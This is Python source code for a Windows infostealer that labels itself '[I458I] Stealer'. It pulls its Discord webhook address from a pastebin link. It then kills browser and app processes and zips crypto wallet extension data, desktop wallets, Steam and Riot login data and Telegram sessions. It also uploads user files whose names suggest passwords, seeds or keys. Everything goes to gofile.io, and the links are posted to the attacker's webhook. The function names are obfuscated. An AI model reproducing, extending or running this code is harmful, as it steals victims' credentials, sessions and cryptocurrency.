import os
import re
import sys
import time
import shutil
import ctypes
import winreg
import requests
import urllib
import random
import warnings
import threading
import subprocess
import base64
from sys import executable, stderr
from json import loads, dumps
from zipfile import ZipFile, ZIP_DEFLATED
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
import ssl
def Z1PF01D3r(foldername, target_dir):            
    zipobj = ZipFile(temp+"/"+foldername + '.zip', 'w', ZIP_DEFLATED)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            if not "user_data" in fn:
                zipobj.write(fn, fn[rootlen:])
def L04DUr118(rhook, data='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(rhook, data=data, headers=headers))
            else:
                r = urlopen(Request(rhook, data=data))
            return r
        except: 
           pass
def UP104D(name, link): #535
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if "Data Searcher" in name:
        data = {
            "content": "",
            "embeds": [
                {
               "title": f"Data Extractor",
                "color": 2895667,
                "fields": link,
                "footer": {
                    "text": f"",
                    "icon_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&"
                },
                }
            ],
            "username": f"[I458I] Stealer.",
            "avatar_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&",
            "attachments": []
            }
        L04DUr118(rhook, data=dumps(data).encode(), headers=headers)
        return
    
    if name == "kiwi":
        string = link.split("\n\n")
        endlist = []
        for i in string:
            i = i.split("\n")
            i = list(filter(None, i))
            val = ""
            for x in i:
                if x.startswith("└─"):
                    val += x + "\n"
            if len(i) > 1:
                endlist.append({"name": i[0], "value": val, "inline": False})
        data = {
            "content":  "",
            "embeds": [
                {
                "color": 2895667,
                "fields": endlist,
                "title": f"Files",
                "footer": {
                    "text": f"",
                    "icon_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&"
                }
                }
            ],
            "username": f"[I458I] Stealer.",
            "avatar_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&",
            "attachments": []
            }
        L04DUr118(rhook, data=dumps(data).encode(), headers=headers)
        return 
def G47H3rZ1P5(paths1, paths2, paths3): #855
    thttht = []
    for walletids in w411375:
        
        for patt in paths1:
            a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[5]+str(walletids[0]), patt[1]])
            a.start()
            thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=Z1P73136r4M, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht:
        thread.join()
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
    wal, ga, ot = "",'',''
    if not len(W411375Z1p) == 0:
        wal = "<:ETH:975438262053257236>  •  Wallets\n"
        for i in W411375Z1p:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(G4M1N6Z1p) == 0:
        ga = "<:blackgengar:1111366900690202624>  •  Gaming:\n"
        for i in G4M1N6Z1p:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(O7H3rZ1p) == 0:
        ot = "<:black_planet:1095740276850569226>  •  Apps\n"
        for i in O7H3rZ1p:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content":  "",
        "embeds": [
            {
            "title": f"Crypto Wallets",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 2895667,
            "footer": {
                "text": f"",
                "icon_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&"
            }
            }
        ],
        "username": f"[I458I] Stealer.",
        "avatar_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&",
        "attachments": []
    }
    
    L04DUr118(rhook, data=dumps(data).encode(), headers=headers)
def Z1P73136r4M(path, arg, procc): #914
    global O7H3rZ1p
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)
    Z1PF01D3r(name, pathC)

    for i in range(3):
        lnik = UP104D7060F113(f'{temp}/{name}.zip')
        if "https://" in str(lnik):
            break
        time.sleep(4)
    os.remove(f"{temp}/{name}.zip")
    O7H3rZ1p.append([arg, lnik])
def L97K():
    hook = requests.get("https://pastebin.com/raw/qRw2xLmF").content.decode()
    global rhook
    rhook = (base64.b64decode(hook)).decode()
def Z1P7H1N65(path, arg, procc): #931
    pathC = path
    name = arg
    
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
    for walllts in w411375:
        if str(walllts[0]) in arg:
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"{str(walllts[1])}_{browser}"
            pathC = path + arg

    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)

    if "Wallet" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg

    Z1PF01D3r(name, pathC) 

    for i in range(3):
        lnik = UP104D7060F113(f'{temp}/{name}.zip')
        if "https://" in str(lnik):break
        time.sleep(4)

    os.remove(f"{temp}/{name}.zip")
    if "/Local Extension Settings/" in arg or "/HougaBouga/"  in arg or "wallet" in arg.lower():
        W411375Z1p.append([name, lnik])
    elif "Steam" in name or "RiotCli" in name:
        G4M1N6Z1p.append([name, lnik])
    else:
        O7H3rZ1p.append([name, lnik])
def S74r77Hr34D(meth, args = []): #976
    a = threading.Thread(target=meth, args=args)
    a.start()
    THr34D1157.append(a)
def G47H3r411(): #981
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                 Password/CC < 3 >     Cookies < 4 >                 Extentions < 5 >                           '
    br0W53rP47H5 = [    
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",         "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ]
    ]
    d15C0rDP47H5 = [
        [f"{roaming}/discord",          "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord",        "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary",    "/Local Storage/leveldb"],
        [f"{roaming}/discordptb",       "/Local Storage/leveldb"],
    ]

    p47H570Z1P = [
        [f"{roaming}/atomic/Local Storage/leveldb",                             "Atomic Wallet.exe",        "Wallet"        ],
        [f"{roaming}/Guarda/Local Storage/leveldb",                             "Guarda.exe",               "Wallet"        ],
        [f"{roaming}/Zcash",                                                    "Zcash.exe",                "Wallet"        ],
        [f"{roaming}/Armory",                                                   "Armory.exe",               "Wallet"        ],
        [f"{roaming}/bytecoin",                                                 "bytecoin.exe",             "Wallet"        ],
        [f"{roaming}/Exodus/exodus.wallet",                                     "Exodus.exe",               "Wallet"        ],
        [f"{roaming}/Binance/Local Storage/leveldb",                            "Binance.exe",              "Wallet"        ],
        [f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",     "Jaxx.exe",                 "Wallet"        ],
        [f"{roaming}/Electrum/wallets",                                         "Electrum.exe",             "Wallet"        ],
        [f"{roaming}/Coinomi/Coinomi/wallets",                                  "Coinomi.exe",              "Wallet"        ],
        ["C:\Program Files (x86)\Steam\config",                                 "steam.exe",                "Steam"         ],
        [f"{local}/Riot Games/Riot Client/Data",                                "RiotClientServices.exe",   "RiotClient"    ],
    ]
    t3136r4M = [f"{roaming}/Telegram Desktop/tdata", 'Telegram.exe', "Telegram"]

    S74r77Hr34D(G47H3rZ1P5,    [br0W53rP47H5, p47H570Z1P, t3136r4M]                 )
    for thread in THr34D1157:
        thread.join()
def UP104D7060F113(path): #1036
    try:
        servers = requests.get("https://api.gofile.io/servers").json()["data"]["servers"]
        
        if servers:
            selected_server = servers[0]["name"]
            upload_url = f'https://{selected_server}.gofile.io/contents/uploadfile'
            r = subprocess.Popen(f'curl -X POST "{upload_url}" -F "file=@{path}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            
            return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
    except Exception as e:
        print(f"Error: {e}")
        return False
def K1W1F01D3r(pathF, keywords): #1050
    global K1W1F113s
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = UP104D7060F113(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    K1W1F113s.append(["folder", pathF + "/", ffound])
K1W1F113s = []
def K1W1F113(path, keywords): #1067
    global K1W1F113s
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and os.stat(path + "/" + file).st_size < 500000 and not ".lnk" in file:
                    fifound.append([path + "/" + file, UP104D7060F113(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    K1W1F01D3r(target, keywords)
                    break

    K1W1F113s.append(["folder", path, fifound])
def K1W1(): #1084
    user = temp.split("\AppData")[0]
    path2search = [
        user    + "/Desktop",
        user    + "/Downloads",
        user    + "/Documents",
        roaming + "/Microsoft/Windows/Recent",
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "bot",
        "atomic",
        "account",
        "acount",
        "paypal",
        "banque",
        "bot",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "seed",
        "mnemonic"
        "memoric",
        "private",
        "key",
        "passphrase",
        "pass",
        "phrase",
        "steal",
        "bank",
        "info",
        "casino",
        "prv",
        "privé",
        "prive",
        "telegram",
        "identifiant",
        "personnel",
        "trading"
        "bitcoin",
        "sauvegarde",
        "funds",
        "récupé",
        "recup",
        "note",
    ]
   
    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles])
        kiwi.start()
        wikith.append(kiwi)
    return wikith
def filestealr(): #1153
    wikith = K1W1()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in K1W1F113s:
        if len(arg[2]) != 0:
            foldpath = arg[1].replace("\\", "/")
            foldlist = arg[2]
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─<:openfolder:1111408286332375040> [{fileanme}]({b})\n"
            filetext += "\n"
    UP104D("kiwi", filetext)
global k3YW0rd, c00K1W0rDs, p45WW0rDs, C00K1C0UNt, P455WC0UNt, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157
DETECTED = False
w411375 = [
    ["nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"         ],
    ["ejbalbakoplchlghecdalmeeeajnimhm", "Metamask"         ],
    ["fhbohimaelbohpjbbldcngcnapndodjp", "Binance"          ],
    ["hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"         ],
    ["fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin"            ],
    ["egjidjbpglichdcondbcbdnbeeppgdph", "Trust"            ],
    ["ojggmchlghnjlapmfbnjholfjkiidbch", "Venom"            ],
    ["opcgpfmipidbgpenhmajoajpbobppdil", "Sui"              ],
    ["efbglgofoippbgcjepnhiblaibcnclgk", "Martian"          ],
    ["ibnejdfjmmkpcnlpebklmnkoeoihofec", "Tron"             ],
    ["ejjladinnckdgjemekebdpeokbikhfci", "Petra"            ],
    ["phkbamefinggmakgklpkljjmgibohnba", "Pontem"           ],
    ["ebfidpplhabeedpnhjnobghokpiioolj", "Fewcha"           ],
    ["afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math"             ],
    ["aeachknmefphepccionboohckonoeemg", "Coin98"           ],
    ["bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"    ],
    ["aholpfdialjgjfhomihkjbmgjidlcdno", "ExodusWeb3"       ],
    ["bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"          ],
    ["agoakfejjabomempkjlepdflaleeobhb", "Core"             ],
    ["mfgccjchihfkkindfppnaooecgfneiii", "Tokenpocket"      ],
    ["lgmpcpglpngdoalbgeoldeajfclnhafa", "Safepal"          ],
    ["bhhhlbepdkbapadjdnnojkbgioiodbic", "Solfare"          ],
    ["jblndlipeogpafnldhgmapagcccfchpi", "Kaikas"           ],
    ["kncchdigobghenbbaddojjnnaogfppfj", "iWallet"          ],
    ["ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"            ],
    ["hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"           ],
    ["cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"     ],
    ["amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"           ],
    ["fhilaheimglignddkjgofkcbgekhenbh", "Oxygen"           ],
    ["nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEWCX"            ],
    ["nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"            ],
    ["nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"           ], 
    ["aiifbnbfobpmeekipheeijimdpnlpgpp", "TerraStation"     ],
    ["fnnegphlobjdpkhecapkijjdkgcjhkib", "HarmonyOutdated"  ],
    ["cgeeodpfagjceefieflmdfphplkenlfk", "Ever"             ],
    ["pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain"      ],
    ["mgffkfbidihjpoaomajlbgchddlicgpn", "PaliWallet"       ],
    ["aodkkagnadcbobfpggfnjeongemjbjca", "BoltX"            ],
    ["kpfopkelmapcoipemfendmdcghnegimn", "Liquality"        ],
    ["hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI"            ],
    ["lpfcbjknijpeeillifnkikgncikgfhdo", "Nami"             ],
    ["dngmlblcodfobpdpecaadgfbcggfjfnm", "MaiarDEFI"        ],
    ["ookjlbkiijinhpmnjffcofjonbfbgaoc", "TempleTezos"      ],
    ["eigblbgjknlfbajkfhopmcojidlgcehm", "XMR.PT"           ],
]
L97K()
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

k3YW0rd = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', '[stake](https://stake.com)']
C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0
c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157, K1W1F113s, B00KM4rK5, T0K3Ns = [], [], [], [], [], [], [], [], [], [], [], [], [], ''

try:
    gofileserver = requests.get("https://api.gofile.io/servers").json()["data"]["servers"][0]["name"]
except:
    gofileserver = "store4"



G47H3r411()
wikith = K1W1()

for thread in wikith: thread.join()
time.sleep(0.2)

filetext = "\n"
for arg in K1W1F113s:
    if len(arg[2]) != 0:
        foldpath = arg[1]
        foldlist = arg[2]       
        filetext += f"<:openfolder:1111408286332375040> {foldpath}\n"

        for ffil in foldlist:
            a = ffil[0].split("/")
            fileanme = a[len(a)-1]
            b = ffil[1]
            filetext += f"└─<:openfolder:1111408286332375040> [{fileanme}]({b})\n"
        filetext += "\n"
UP104D("kiwi", filetext) 